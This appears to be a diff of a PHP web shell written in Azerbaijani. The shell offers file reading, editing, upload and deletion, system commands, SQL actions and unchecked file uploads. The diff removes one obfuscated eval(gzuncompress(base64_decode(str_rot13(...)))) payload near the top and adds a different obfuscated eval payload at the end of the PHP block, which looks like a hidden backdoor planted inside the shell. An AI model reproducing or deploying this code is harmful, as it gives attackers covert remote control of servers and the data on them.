@@ -4,9 +4,7 @@ session_start();
 $baqliFunksiyalar = explode(",", "");
 $safeMode = true;
 $actions = array("esas","fayl_oxu","phpinfo","sistem_kom","fayl_redakte","fayl_yukle",'fayl_sil','fayl_yarat','papka_yarat','fayl_sifirla' , 'papka_sil','fayl_ad_deyish', 'ziple' , 'skl' , 'skl_d_t' , 'skl_d', 'fayl_upl');
-$ne = isset($_POST['ne']) && in_array($_POST['ne'],$actions) ? $_POST['ne'] : "esas"; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
-
-
+$ne = isset($_POST['ne']) && in_array($_POST['ne'],$actions) ? $_POST['ne'] : "esas"; 
 
 function shifrele($str)
 {
@@ -362,7 +360,7 @@ else if($ne == 'fayl_upl' && isset($_FILES['ufayl']))
 {
     move_uploaded_file($_FILES['ufayl']['tmp_name'], $default_dir . '/' . $_FILES['ufayl']['name']);
     print "Upload oldu deyesen.";
-}
+};  eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
 ?>
 <html>
 <head>
